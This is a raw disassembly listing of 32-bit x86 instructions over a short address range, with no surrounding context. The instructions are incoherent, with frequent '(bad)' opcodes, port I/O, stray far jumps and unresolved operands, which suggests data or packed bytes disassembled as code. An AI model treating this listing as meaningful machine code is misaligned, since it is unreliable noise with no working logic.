  41820f:	add    BYTE PTR [edi+ecx*4+0x56f1d047],al
  418216:	dec    esi
  418217:	mov    al,ds:0xee4c1eac
  41821c:	(bad)  
  41821d:	div    BYTE PTR [ebx-0x700aca7b]
  418223:	pop    esi
  418224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418225:	jg     0x418290
  418227:	out    0x9e,eax
  418229:	mov    ah,0x6d
  41822b:	test   al,0x9f
  41822d:	push   ss
  41822e:	sbb    ah,BYTE PTR [eax-0x7d]
  418231:	in     eax,0x94
  418233:	pop    ebx
  418234:	or     eax,0x35879bdb
  418239:	push   DWORD PTR [esi]
  41823b:	inc    ebx
  41823c:	lods   eax,DWORD PTR ds:[si]
  41823e:	sub    DWORD PTR [ebp-0x608fca8e],0xfffffff0
  418245:	outs   dx,DWORD PTR ds:[esi]
  418246:	xor    dh,al
  418248:	pop    ebp
  418249:	aaa    
  41824a:	pop    ds
  41824b:	inc    edi
  41824c:	push   ecx
  41824d:	ja     0x41822e
  41824f:	sti    
  418250:	inc    ebx
  418251:	mov    ecx,0xa1b1b6e2
  418256:	(bad)
  418259:	or     DWORD PTR [ecx+0x7a],edx
  41825c:	push   esi
  41825d:	rcl    BYTE PTR [eax+0x7bc0fafd],cl
  418263:	int3   
  418264:	adc    ah,BYTE PTR [eax+ebp*1-0x7454e517]
  41826b:	shl    ah,0x22
  41826e:	xor    esp,DWORD PTR [ebx+edx*1+0x52]
  418272:	pop    esi
  418273:	jmp    0x4065:0x23320f38
  41827a:	sub    dl,BYTE PTR ds:[ebp-0x1c6abaaf]
  418281:	xor    al,0xc7
  418283:	mov    ecx,0xa86565ea
  418288:	(bad)  
  418289:	in     eax,dx
  41828a:	pushf  
  41828b:	outs   dx,BYTE PTR ds:[esi]
  41828c:	mov    eax,0xfafe48b0
  418291:	sar    BYTE PTR [eax+0x5cc6b0ec],cl
  418297:	dec    ecx
  418298:	mov    al,ds:0xfdc9247
  41829d:	add    cl,BYTE PTR [ebx-0x33]
  4182a0:	ins    BYTE PTR es:[edi],dx
  4182a1:	fsub   DWORD PTR [esi+0x3b]
  4182a4:	or     dh,bl
  4182a6:	nop
  4182a7:	xor    ch,BYTE PTR [ecx+0xdc02a]
  4182ad:	pop    edx
  4182ae:	ja     0x418295
  4182b0:	fwait
  4182b1:	test   al,0x1a
  4182b3:	outs   dx,DWORD PTR ds:[esi]
  4182b4:	or     BYTE PTR [ecx+esi*4],bh
  4182b7:	lea    ebp,[esi-0x23b3135b]
  4182bd:	ret    
  4182be:	or     esp,DWORD PTR [ecx+ecx*1-0x6a]
  4182c2:	and    ah,BYTE PTR [ebx]
  4182c4:	push   cs
  4182c5:	in     eax,dx
  4182c6:	outs   dx,BYTE PTR ds:[esi]
  4182c7:	mov    eax,ds:0x9cc5ff91
  4182cc:	push   ecx
  4182cd:	inc    edx
  4182ce:	push   es
  4182cf:	aaa    
  4182d0:	inc    eax
  4182d1:	in     eax,0x45
  4182d3:	stc    
  4182d4:	repz rcr DWORD PTR [edx+0x27],cl
  4182d8:	push   edi
  4182d9:	fsubr  DWORD PTR [edi+0x57023256]
  4182df:	ror    DWORD PTR [ecx-0x5c],1
  4182e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182e3:	stos   DWORD PTR es:[edi],eax
  4182e4:	stos   DWORD PTR es:[edi],eax
  4182e5:	push   cs
  4182e6:	int3   
  4182e7:	xor    al,0xc8
  4182ea:	push   esi
  4182eb:	mov    eax,0x7424295
  4182f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182f1:	adc    edx,DWORD PTR [edi-0x21]
  4182f4:	dec    ecx
  4182f5:	ins    BYTE PTR es:[edi],dx
  4182f6:	leave  
  4182f7:	leave  
  4182f8:	xchg   ebx,eax
  4182f9:	pop    ebx
  4182fa:	jg     0x418328
  4182fc:	xor    BYTE PTR [edi+ebp*4-0x4ca543c1],ah
  418303:	call   0xa6da24f3
  418308:	out    dx,al
  418309:	sbb    BYTE PTR [edi-0x27],0xdd
  41830d:	iret   
  41830e:	xor    BYTE PTR [ebp-0x51a89228],dl
  418314:	xor    ebp,esp
  418316:	fild   WORD PTR [ebp+0x79]
  418319:	loopne 0x4182a3
  41831b:	out    dx,eax
  41831c:	cmp    BYTE PTR [ebp+0x54],dl
  41831f:	aad    0xbf
  418321:	dec    esi
  418322:	pushf  
  418323:	jo     0x4182e1
  418325:	pop    ecx
  418326:	pop    eax
  418327:	pop    ds
  418328:	and    dh,BYTE PTR [eax-0x629ce8bd]
  41832e:	xchg   edi,eax
  41832f:	out    0xb7,eax
  418331:	xchg   BYTE PTR [eax+0x12],dl
  418334:	in     eax,0xe4
  418336:	jge    0x418390
  418338:	mov    ds:0x972b9154,eax
  41833d:	push   edi
  41833e:	or     cl,al
  418340:	mov    bl,0x86
  418342:	pop    edx
  418343:	adc    esp,edi
  418345:	(bad)  
  418346:	and    edx,DWORD PTR [eax+0x72649c19]
  41834c:	pop    ecx
  41834d:	bound  ecx,QWORD PTR [eax-0x5d]
  418350:	stos   DWORD PTR es:[edi],eax
  418351:	std    
  418352:	cmp    DWORD PTR [esi],ecx
  418354:	icebp  
  418355:	inc    ebp
  418356:	mov    eax,0xb5961630
  41835b:	push   ss
  41835c:	retf   0x484f
  41835f:	dec    eax
  418360:	pop    ebx
  418361:	out    0xdb,al
  418363:	loopne 0x418382
  418365:	ins    BYTE PTR es:[edi],dx
  418366:	pop    es
  418367:	adc    al,0xe
  418369:	xor    BYTE PTR [edi],cl
  41836b:	push   edi
  41836c:	in     eax,0x55
  41836e:	nop
  41836f:	xchg   edx,eax
  418370:	frstor [edi+eiz*8+0x35]
  418374:	xchg   ecx,eax
  418375:	pop    edx
  418376:	test   al,0xce
  418378:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418379:	pop    ds
  41837a:	stc    
  41837b:	jmp    0xb14d1295
  418380:	mov    dl,0xd5
  418382:	mov    al,0xbe
  418384:	cmp    DWORD PTR [edx],edi
  418386:	pop    edx
  418387:	cmp    ebp,DWORD PTR [ebx+0x2dd26151]
  41838d:	fisttp WORD PTR [eax+esi*1-0x7c]
  418391:	out    dx,al
  418392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418393:	xchg   edx,eax
  418394:	daa    
  418395:	inc    esi
  418396:	imul   esi,eax,0x95ad5a7a
  41839c:	adc    al,0x45
  41839e:	mov    cl,BYTE PTR [edx]
  4183a0:	xor    al,0x6c
  4183a2:	xor    esp,esp
  4183a4:	mov    cs,WORD PTR ds:0x30274fdc
  4183aa:	push   esp
  4183ab:	inc    ebx
  4183ac:	mov    al,ds:0x82d4f4c3
  4183b1:	loopne 0x418363
  4183b3:	or     BYTE PTR [edi-0x27],dl
  4183b6:	pop    ecx
  4183b7:	push   ss
  4183b8:	call   0x5c0be25b
  4183bd:	fwait
  4183be:	lea    ecx,[ebp-0xb]
  4183c1:	div    edx
  4183c3:	fstp   DWORD PTR [edx-0x70]
  4183c6:	inc    BYTE PTR [ebx]
  4183c8:	ins    BYTE PTR es:[edi],dx
  4183c9:	inc    esp
  4183ca:	ins    DWORD PTR es:[edi],dx
  4183cb:	sub    ch,ch
  4183cd:	xlat   BYTE PTR ds:[ebx]
  4183ce:	or     eax,0x156da781
  4183d3:	pop    edi
  4183d4:	jecxz  0x418447
  4183d6:	adc    edi,DWORD PTR [edx+eiz*8+0x401623e5]
  4183dd:	sub    ecx,esi
  4183df:	jge    0x4183eb
  4183e1:	pop    esp
  4183e2:	dec    esp
  4183e3:	push   0x5d
  4183e5:	fldenv [edi]
  4183e7:	je     0x41837e
  4183e9:	inc    ebx
  4183ea:	ffree  st(5)
  4183ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183ed:	xor    bh,BYTE PTR [ebx]
  4183ef:	sub    bh,cl
  4183f1:	popa   
  4183f2:	mov    ss,WORD PTR [ebp-0x60]
  4183f5:	cmp    DWORD PTR [edi],ebp
  4183f7:	jnp    0x4183dc
  4183f9:	pop    ebx
  4183fa:	add    DWORD PTR [edi-0x62ed1eb3],edi
  418400:	jnp    0x4183db
  418402:	jp     0x41843b
  418404:	adc    al,0x2c
  418406:	mov    bl,0x60
  418408:	in     eax,0x4a
  41840a:	inc    ebx
  41840b:	stos   DWORD PTR es:[edi],eax
  41840c:	jge    0x418477
  41840e:	adc    dl,BYTE PTR [edx+0x4ab53dcd]
  418414:	mov    bl,0xca
  418416:	stos   BYTE PTR es:[edi],al
  418417:	pop    esi
  418418:	or     eax,0xea2f4981
  41841d:	sar    ch,0x46
  418420:	push   ss
  418421:	push   esp
  418422:	push   ecx
  418423:	mov    BYTE PTR [edx+0x4b01a907],ah
  418429:	inc    eax
  41842a:	in     al,0x1e
  41842c:	sbb    al,0xe3
  41842e:	push   ebp
  41842f:	outs   dx,BYTE PTR ds:[esi]
  418430:	and    eax,0x62008d0e
  418435:	shl    DWORD PTR [esi],1
  418437:	(bad)  
  418438:	xchg   ecx,eax
  418439:	add    eax,0xd6d793e9
  41843e:	and    DWORD PTR ds:0x1d5b1f99,ecx
  418444:	fld    TBYTE PTR [eax]
  418446:	push   edi
  418447:	mov    esp,0xa06e97bb
  41844c:	mov    ecx,0xc91d7bde
  418451:	push   DWORD PTR [edx]
  418453:	jmp    0xec4b:0x28ee30d6
  41845a:	push   ebx
  41845b:	pusha  
  41845c:	inc    ebp
  41845d:	ret    
  41845e:	mov    ebx,0xaec341fd
  418463:	mov    cl,0xd4
  418465:	into   
  418466:	(bad)  
  418467:	pop    ds
  418468:	or     eax,0x4cfb89d4
  41846d:	sub    DWORD PTR [esp+esi*4+0x65318d26],edx
  418474:	inc    esp
  418475:	xor    esp,ebx
  418477:	mov    al,BYTE PTR [esi]
  418479:	ret    
  41847a:	push   esp
  41847b:	stos   BYTE PTR es:[edi],al
  41847c:	ins    BYTE PTR es:[edi],dx
  41847d:	clc    
  41847e:	call   FWORD PTR [eax-0x387a161c]
  418484:	loope  0x418427
  418486:	sti    
  418487:	mov    ebx,0x79193b2b
  41848c:	leave  
  41848d:	cmp    esp,ecx
  41848f:	rol    DWORD PTR [ebp+0x1df30877],1
  418495:	into   
  418496:	test   ah,cl
  418498:	mov    edx,0xc19a508e
  41849d:	ret    
  41849e:	inc    ebp
  41849f:	cdq    
  4184a0:	xchg   ebp,eax
  4184a1:	jecxz  0x418447
  4184a3:	jns    0x41849f
  4184a5:	sar    ah,1
  4184a7:	adc    eax,0x2932fbdd
  4184ac:	ret    0x44f6
  4184af:	mov    dh,0x89
  4184b1:	in     al,0x9a
  4184b3:	jbe    0x418495
  4184b5:	xor    eax,DWORD PTR [ecx+0x7e]
  4184b8:	cmp    eax,0x770482d4
  4184bd:	int    0x33
  4184bf:	jns    0x418477
  4184c1:	shl    DWORD PTR [ecx+0xc50394f],cl
  4184c7:	test   DWORD PTR [edi],edx
  4184c9:	xor    bh,BYTE PTR [ebp-0x73]
  4184cc:	and    BYTE PTR [ecx+0x60],al
  4184cf:	and    al,BYTE PTR [edi]
  4184d1:	inc    ebx
  4184d2:	fsub   QWORD PTR [edx]
  4184d4:	rcr    DWORD PTR [edx-0x550c7c89],0x2b
  4184db:	ja     0x4184b4
  4184dd:	mov    dh,0x5a
  4184df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184e0:	iret   
  4184e1:	cmc    
  4184e2:	mov    al,0x74
  4184e4:	xor    bl,cl
  4184e6:	pop    edi
  4184e7:	stos   BYTE PTR es:[edi],al
  4184e8:	lea    ecx,[ebx]
  4184ea:	push   ebx
  4184eb:	fwait
  4184ec:	(bad)  
  4184ed:	outs   dx,DWORD PTR ds:[esi]
  4184ee:	xchg   edi,eax
  4184ef:	jo     0x418471
  4184f1:	(bad)  
  4184f2:	mov    esi,0x55393505
  4184f7:	hlt    
  4184f8:	fidiv  WORD PTR [ecx+0xe8d88f2]
  4184fe:	jmp    0xc3e4:0xc0be8b58
  418505:	test   BYTE PTR [ebx],0xc5
  418508:	call   0x1897:0x58ae570b
  41850f:	(bad)  
  418510:	mov    bl,0x10
  418512:	das    
  418513:	pop    ebp
  418514:	sub    al,0x9e
  418516:	lahf   
  418517:	cmc    
  418518:	loop   0x4184c0
  41851a:	and    cl,0x3
  41851d:	js     0x418550
  41851f:	jge    0x418548
  418521:	sub    eax,edx
  418523:	(bad)  
  418524:	iret   
  418525:	mov    ds:0xdbefef48,eax
  41852a:	aaa    
  41852b:	xchg   ebp,eax
  41852c:	jp     0x41859c
  41852e:	test   eax,0x5075d442
  418533:	xor    eax,0xf218bf85
  418538:	mov    eax,0x615aca38
  41853d:	xchg   ebx,eax
  41853e:	jmp    0x7071:0x85d39462
  418545:	add    bh,0x17
  418548:	mov    ds:0xf77ccf5d,al
  41854d:	xchg   esp,eax
  41854e:	in     eax,dx
  41854f:	add    eax,0x94717df1
  418554:	adc    esi,DWORD PTR [ebx]
  418556:	aam    0x4c
  418558:	fwait
  418559:	rcr    BYTE PTR [ebx+0x6f],cl
  41855c:	sti    
  41855d:	cmp    eax,0xdaa56e22
  418562:	jno    0x41850b
  418564:	iret   
  418565:	mov    edi,0xcb91394e
  41856a:	mov    ebp,0x95ed998d
  41856f:	shr    ecx,1
  418571:	stos   BYTE PTR es:[edi],al
  418572:	pop    esp
  418573:	std    
  418574:	adc    eax,0xab21be13
  418579:	sar    BYTE PTR [esi-0xd],1
  41857c:	inc    edi
  41857d:	push   ecx
  41857e:	pop    esp
  41857f:	jnp    0x4185be
  418581:	dec    esi
  418582:	std    
  418583:	cld    
  418584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418585:	test   eax,0xa43a91b0
  41858a:	(bad)  
  41858b:	out    0xf0,al
  41858d:	in     al,0xd9
  41858f:	sbb    cl,BYTE PTR [esi-0x13a29b86]
  418595:	pop    eax
  418596:	push   cs
  418597:	pop    ebx
  418598:	fwait
  418599:	adc    DWORD PTR [esi+eiz*2+0x75d76771],0xffffffed
  4185a1:	and    dh,BYTE PTR [esi-0x44]
  4185a4:	adc    BYTE PTR [edi-0x11],bh
  4185a7:	lds    edx,FWORD PTR [edx-0x158b369]
  4185ad:	aad    0xc
  4185af:	popa   
  4185b0:	pop    edx
  4185b1:	lea    ecx,[edi]
  4185b3:	out    dx,al
  4185b4:	xchg   BYTE PTR [ebp-0x56],al
  4185b7:	add    eax,0x4b450f23
  4185bc:	inc    esp
  4185bd:	dec    ecx
  4185be:	and    eax,0x5bf0d683
  4185c3:	fistp  DWORD PTR [edi]
  4185c5:	(bad)  [esp+edx*8]
  4185c8:	(bad)  
  4185c9:	xor    edi,DWORD PTR [eax-0x1976e310]
  4185cf:	cmp    al,0xf1
  4185d1:	xchg   BYTE PTR [ecx],al
  4185d3:	int3   
  4185d4:	jg     0x4185dd
  4185d6:	shr    BYTE PTR ds:0x4f5a4408,cl
  4185dc:	mov    eax,0xf293765
  4185e1:	cwde   
  4185e2:	xor    DWORD PTR [edx+eiz*2-0x25a00145],0xd0724dea
  4185ed:	outs   dx,BYTE PTR ds:[esi]
  4185ee:	xlat   BYTE PTR ds:[ebx]
  4185ef:	pop    eax
  4185f0:	mov    al,ds:0x72893327
  4185f5:	stos   DWORD PTR es:[edi],eax
  4185f6:	repnz cli 
  4185f8:	je     0x418621
  4185fa:	enter  0x3cd6,0x76
  4185fe:	sbb    DWORD PTR [edx-0x2c500faa],esi
  418604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418605:	cmp    dh,BYTE PTR [ebp+0x4f]
  418608:	or     eax,0x68c4f8d9
  41860d:	jmp    0x418642
  41860f:	(bad)  
  418610:	sub    al,0x8b
  418612:	pop    es
  418613:	mov    esi,0xf659eebf
  418618:	or     al,0x20
  41861a:	push   ebx
  41861b:	mov    ebx,0xcc0c45a9
  418620:	sbb    bl,BYTE PTR [eax]
  418622:	inc    ebp
  418623:	dec    ebx
  418624:	jmp    0x9368ecd8
  418629:	ins    DWORD PTR es:[edi],dx
  41862a:	ret    
  41862b:	pop    esp
  41862c:	ja     0x418688
  41862e:	popa   
  41862f:	stos   DWORD PTR es:[edi],eax
  418630:	or     eax,0x462c4ea8
  418635:	adc    al,0x45
  418637:	pushf  
  418638:	lahf   
  418639:	cmp    DWORD PTR [edx],esi
  41863b:	das    
  41863c:	and    ah,BYTE PTR [eax+0x23457e11]
  418642:	sub    BYTE PTR ds:0x571e0f2d,0xbb
  418649:	pushf  
  41864a:	stc    
  41864b:	cmp    bl,BYTE PTR [eax]
  41864d:	rcl    BYTE PTR [eax+0x73fa52fb],0xf3
  418654:	fcomp  QWORD PTR [esi+ecx*2-0x3a02009f]
  41865b:	rcr    esp,1
  41865d:	iret   
  41865e:	ds mov bh,0x6e
  418661:	cwde   
  418662:	lds    ebx,FWORD PTR [esi-0x8]
  418665:	in     al,0xc1
  418667:	mov    ebx,DWORD PTR [ebx]
  418669:	pop    eax
  41866a:	xor    al,0xaf
  41866c:	jp     0x4185ff
  41866e:	jl     0x418649
  418670:	jbe    0x418609
  418672:	add    BYTE PTR [eax],bl
  418674:	sbb    eax,0x125b9c20
  418679:	enter  0x9187,0xd6
  41867d:	mov    BYTE PTR ss:[eax],dl
  418680:	int    0x43
  418682:	mov    BYTE PTR [ebx+0x63cedbe1],bh
  418688:	ds push es
  41868a:	in     al,0x76
  41868c:	inc    esp
  41868d:	cmp    al,0xd2
  41868f:	adc    BYTE PTR [esi-0x2c],cl
  418692:	add    cl,BYTE PTR [esi-0x62]
  418695:	add    dl,BYTE PTR [ebx-0x4ec996b8]
  41869b:	pop    edx
  41869c:	retf   
  41869d:	or     BYTE PTR [edi+0x38],dl
  4186a0:	and    al,0xa8
  4186a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186a3:	add    eax,DWORD PTR [eax+ebx*4-0x33e5f9bc]
  4186aa:	lods   al,BYTE PTR ds:[esi]
  4186ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186ac:	mov    al,0xfc
  4186ae:	sbb    DWORD PTR [ebp+eax*2-0x3c920202],ecx
  4186b5:	idiv   DWORD PTR [ebx+0x46]
  4186b8:	add    ebx,edi
  4186ba:	mov    cl,0x76
  4186bc:	sub    BYTE PTR [edi+0x77],ah
  4186bf:	fwait
  4186c0:	add    DWORD PTR [ebx-0x3fc17dad],0xc19326bb
  4186ca:	es pop edx
  4186cc:	ror    DWORD PTR ds:[eax-0x489ba8a4],cl
  4186d3:	aaa    
  4186d4:	fidivr WORD PTR [eax+0x2a]
  4186d7:	pop    es
  4186d8:	loope  0x41874a
  4186da:	daa    
  4186db:	jno    0x4186a1
  4186dd:	push   ds
  4186de:	loop   0x41869e
  4186e0:	dec    eax
  4186e1:	(bad)  
  4186e2:	sbb    al,0x18
  4186e4:	push   edi
  4186e5:	and    dh,BYTE PTR [ebx]
  4186e7:	dec    BYTE PTR [ebx-0x63]
  4186ea:	pop    eax
  4186eb:	iret   
  4186ec:	sbb    dl,dh
  4186ee:	jmp    0x7bd7:0xd5846d15
  4186f5:	inc    eax
  4186f6:	push   cs
  4186f7:	bound  eax,QWORD PTR [ebx]
  4186f9:	fwait
  4186fa:	jmp    0x4186d1
  4186fc:	fdivr  QWORD PTR [esi]
  4186fe:	leave  
  4186ff:	std    
  418700:	pushf  
  418701:	add    dh,0x89
  418704:	pop    ecx
  418705:	cld    
  418706:	and    eax,0xb8d17daf
  41870b:	mov    bl,0x4f
  41870d:	out    0x59,eax
  41870f:	mov    ecx,0x6eb5aa08
  418714:	aad    0xb0
  418716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418717:	mov    ah,0x45
  418719:	adc    BYTE PTR [edx-0x7f30c6d9],cl
  41871f:	sahf   
  418720:	push   0x6d
  418722:	nop
  418723:	push   esi
  418724:	push   edx
  418725:	test   DWORD PTR [eax+0x6579ad78],ebp
  41872b:	and    eax,DWORD PTR gs:[edx-0x5bac5f64]
  418732:	out    dx,al
  418733:	(bad)  
  418734:	sbb    bh,BYTE PTR ds:0x72fa6a06
  41873a:	into   
  41873b:	test   DWORD PTR [ecx-0x5cae3d3c],esp
  418741:	and    eax,0xdf1a62e2
  418746:	ins    BYTE PTR es:[edi],dx
  418747:	cwde   
  418748:	ret    0xef54
  41874b:	test   DWORD PTR [ebx+0x2ebf9092],edx
  418751:	ds xchg edi,eax
  418753:	sbb    BYTE PTR [ebx+0x5e],al
  418756:	and    BYTE PTR [edi+0x45a4503c],0x4e
  41875d:	in     eax,dx
  41875e:	dec    esp
  41875f:	adc    eax,eax
  418761:	or     bl,dh
  418763:	retf   
  418764:	push   ebp
  418765:	fidiv  WORD PTR [ebx]
  418767:	(bad)  
  418769:	mov    ebp,0x7bbf3c3d
  41876e:	aad    0xd9
  418770:	mov    edi,0xc4a60115
  418775:	or     BYTE PTR [ecx+0x57],0x83
  418779:	inc    ecx
  41877a:	sbb    eax,0xe833fb4b
  41877f:	enter  0xf703,0x34
  418783:	call   0xc45c7644
  418788:	jns    0x418710
  41878a:	and    BYTE PTR [eax-0x99e56e9],bl
  418790:	es icebp 
  418792:	dec    edi
  418793:	(bad)  
  418794:	out    0xc3,eax
  418796:	lods   eax,DWORD PTR ds:[esi]
  418797:	cmp    ecx,DWORD PTR ds:0x2a82acc4
  41879d:	pop    edi
  41879e:	aam    0xce
  4187a0:	pop    esi
  4187a1:	setae  ah
  4187a4:	mov    bl,BYTE PTR [edi]
  4187a6:	adc    BYTE PTR [esi+0xe],0x30
  4187aa:	sbb    eax,0x85dd55bb
  4187af:	cmp    eax,0x2141c879
  4187b4:	inc    ecx
  4187b5:	hlt    
  4187b6:	inc    ebp
  4187b7:	xchg   DWORD PTR [edx-0x7d5ff58c],edi
  4187bd:	pop    esi
  4187be:	pop    esp
  4187bf:	pop    ds
  4187c0:	adc    eax,0x7e76be38
  4187c5:	pop    es
  4187c6:	(bad)  
  4187c7:	add    BYTE PTR [ecx-0x63],bh
  4187ca:	pop    ebx
  4187cb:	or     al,0x8c
  4187cd:	stc    
  4187ce:	aaa    
  4187cf:	xor    ebp,DWORD PTR [ebx-0x39]
  4187d2:	jmp    0x58a8:0xc5f3dbd4
  4187d9:	retf   0x967a
  4187dc:	mov    eax,esp
  4187de:	ret    0xccb0
  4187e1:	(bad)  
  4187e2:	retf   
  4187e3:	mov    al,0xb7
  4187e5:	int    0x4d
  4187e7:	in     al,0xf1
  4187e9:	sbb    dh,cl
  4187eb:	jecxz  0x418823
  4187ed:	jg     0x4187be
  4187ef:	jg     0x4187b5
  4187f1:	int    0x1e
  4187f3:	hlt    
  4187f4:	add    esp,edi
  4187f6:	adc    al,0x85
  4187f8:	dec    ebx
  4187f9:	push   ebp
  4187fa:	arpl   WORD PTR [eax+0x6],sp
  4187fd:	jge    0x41884f
  4187ff:	cdq    
  418800:	leave  
  418801:	call   0x51c12c17
  418806:	ins    DWORD PTR es:[edi],dx
  418807:	mov    DWORD PTR [edx+0x4a5b3e81],ebp
  41880d:	retf   0xfaa7
  418810:	and    edx,DWORD PTR [eax+0x6fc040c9]
  418816:	stc    
  418817:	push   es
  418818:	lea    edi,[edx]
  41881a:	scas   eax,DWORD PTR es:[edi]
  41881b:	add    BYTE PTR [esi-0x202ec284],al
  418821:	sub    eax,0xdb7ecab3
  418826:	push   edx
  418827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418828:	jecxz  0x4187cd
  41882a:	mov    esi,0xe40ec0b5
  41882f:	mov    WORD PTR [edx],ss
  418831:	(bad)  
  418832:	jge    0x41881f
  418834:	or     ecx,edi
  418836:	mov    edx,0xd88b2bda
  41883b:	or     eax,DWORD PTR [edi-0x4a93e4af]
  418841:	mov    ch,0x2f
  418843:	loop   0x41880c
  418845:	fsubr  st(6),st
  418847:	popf   
  418848:	lahf   
  418849:	mov    esp,DWORD PTR [edx+0x1a98f252]
  41884f:	sbb    eax,eax
  418851:	outs   dx,DWORD PTR ds:[esi]
  418852:	mov    WORD PTR [edi+0x39],?
  418855:	xlat   BYTE PTR ds:[ebx]
  418856:	sub    al,0x99
  418858:	outs   dx,BYTE PTR ds:[esi]
  418859:	sub    al,0x5e
  41885b:	sbb    DWORD PTR [esp+esi*8+0x588e42bb],ebp
  418862:	hlt    
  418863:	mov    WORD PTR [ebp-0x451e998e],fs
  418869:	das    
  41886a:	or     ch,BYTE PTR [ebp+ebx*2+0x5c0ad8f]
  418871:	jmp    0x4188c5
  418873:	push   es
  418874:	repnz mov BYTE PTR [esi+0x72],dh
  418878:	(bad)  
  418879:	sbb    DWORD PTR [ebx],ecx
  41887b:	aaa    
  41887c:	mov    gs,WORD PTR [esi]
  41887e:	cmp    BYTE PTR ss:[edi],bl
  418881:	popf   
  418882:	mov    esp,?
  418884:	nop
  418885:	push   0xe0ae42f8
  41888a:	rcl    BYTE PTR [ebx],cl
  41888c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41888d:	sbb    DWORD PTR [eax+0x43],ebx
  418890:	fidiv  WORD PTR [ecx-0x6a9d69d5]
  418896:	imul   edi,DWORD PTR [eax-0x27],0x71b66013
  41889d:	mov    DWORD PTR [ecx],0x7ce07bef
  4188a3:	xor    al,0x9a
  4188a5:	mov    ds:0x547154c8,eax
  4188aa:	and    al,0x3a
  4188ac:	int3   
  4188ad:	imul   ebp,DWORD PTR [edx+0x29ba552c],0x73943d26
  4188b7:	dec    edi
  4188b8:	push   ds
  4188b9:	sbb    eax,DWORD PTR [eax+0x1b891dde]
  4188bf:	mov    cl,0xbf
  4188c1:	push   ebp
  4188c2:	shr    DWORD PTR [eax+ecx*8],cl
  4188c5:	out    dx,al
  4188c6:	fcmovu st,st(6)
  4188c8:	lea    edx,[eax+0x48c1997d]
  4188ce:	sbb    DWORD PTR [ebx+0x4cce91a0],0x9f69c74c
  4188d8:	push   ebx
  4188d9:	jo     0x4188e8
  4188db:	dec    ebp
  4188dc:	lods   al,BYTE PTR ds:[esi]
  4188dd:	fld    TBYTE PTR [esi+eiz*4]
  4188e0:	xchg   DWORD PTR [edx],eax
  4188e2:	iret   
  4188e3:	pushf  
  4188e4:	imul   edx,DWORD PTR [edx],0xffffffb9
  4188e7:	and    al,0x10
  4188e9:	inc    edx
  4188ea:	int    0x5d
  4188ec:	mov    ah,0xfb
  4188ee:	dec    ebp
  4188ef:	out    dx,al
  4188f0:	or     bl,dh
  4188f2:	jne    0x41893d
  4188f4:	stos   BYTE PTR es:[edi],al
  4188f5:	rcl    BYTE PTR [ebp+0x1f83ed5f],cl
  4188fb:	push   ebx
  4188fc:	xor    bh,dh
  4188fe:	shl    DWORD PTR [esp+eax*2-0x19bc4b4a],0x77
  418906:	imul   BYTE PTR [esi]
  418908:	mov    dl,0xca
  41890a:	and    BYTE PTR [ebx],al
  41890c:	xchg   esi,eax
  41890d:	cli    
  41890e:	mov    al,ds:0x66c35ee0
  418913:	imul   edx,DWORD PTR [ecx-0x9],0x2e
  418917:	inc    ebp
  418918:	ret    0x13b1
  41891b:	outs   dx,DWORD PTR ds:[esi]
  41891c:	dec    edi
  41891d:	xchg   ebp,eax
  41891e:	repz push edi
  418920:	add    DWORD PTR [ebp-0x26aaeec8],edi
  418926:	fisub  WORD PTR [esi+edi*1-0x5f]
  41892a:	lock and al,0xb3
  41892d:	push   esi
  41892e:	mov    ds:0xf41ac057,eax
  418933:	neg    DWORD PTR [eax]
  418935:	fdiv   QWORD PTR [eax-0x1300c604]
  41893b:	push   cs
  41893c:	fidivr DWORD PTR [esi+esi*8-0xa]
  418940:	lock mov ds:0xa1ea87b,al
  418946:	in     eax,dx
  418947:	mov    WORD PTR [esi-0x44],ss
  41894a:	cmp    eax,0xfc5bd2e0
  41894f:	and    al,0xdc
  418951:	iret   
  418952:	pusha  
  418953:	das    
  418954:	clc    
  418955:	adc    eax,0x540857ed
  41895a:	mov    cs,WORD PTR [esi-0xc]
  41895d:	pop    esp
  41895e:	adc    al,0xa3
  418960:	loop   0x4188e9
  418962:	repnz or cl,BYTE PTR [ebx]
  418965:	jo     0x41899a
  418967:	clc    
  418968:	outs   dx,BYTE PTR ds:[esi]
  418969:	mov    ds:0xce97ed1,eax
  41896e:	fldenv [edi]
  418970:	add    ebp,edx
  418972:	cmc    
  418973:	sti    
  418974:	enterw 0x74df,0xb3
  418979:	stc    
  41897a:	push   cs
  41897b:	lods   al,BYTE PTR ds:[esi]
  41897c:	cmp    BYTE PTR [edx+0x34],ah
  41897f:	les    ecx,FWORD PTR [bp+di+0x10]
  418983:	inc    ecx
  418984:	ret    
  418985:	mov    ah,0xe3
  418987:	outs   dx,DWORD PTR ds:[esi]
  418988:	mov    eax,0xd021709
  41898d:	lods   al,BYTE PTR ds:[esi]
  41898e:	cdq    
  41898f:	adc    BYTE PTR [edx-0x3c5fbe4],al
  418995:	out    dx,eax
  418996:	adc    al,0x92
  418998:	xchg   edx,eax
  418999:	pop    es
  41899a:	test   bl,bh
  41899c:	jbe    0x41897b
  41899e:	fs inc ebp
  4189a0:	add    al,0x33
  4189a2:	ins    BYTE PTR es:[edi],dx
  4189a3:	inc    ebx
  4189a4:	and    BYTE PTR [edi-0x71],ch
  4189a7:	jl     0x35ecb9f
  4189ad:	in     eax,0x97
  4189af:	push   esi
  4189b0:	fidivr DWORD PTR [edi]
  4189b2:	jle    0x4189e5
  4189b4:	mov    ds:0x50dd7d61,al
  4189ba:	and    eax,0xcac28356
  4189bf:	dec    edx
  4189c0:	(bad)  
  4189c1:	push   esi
  4189c2:	repz xchg esp,eax
  4189c4:	fnsetpm(287 only) 
  4189c6:	je     0x4189bf
  4189c8:	jo     0x418a10
  4189ca:	ror    BYTE PTR [edx],1
  4189cc:	pushf  
  4189cd:	rol    dh,0x5a
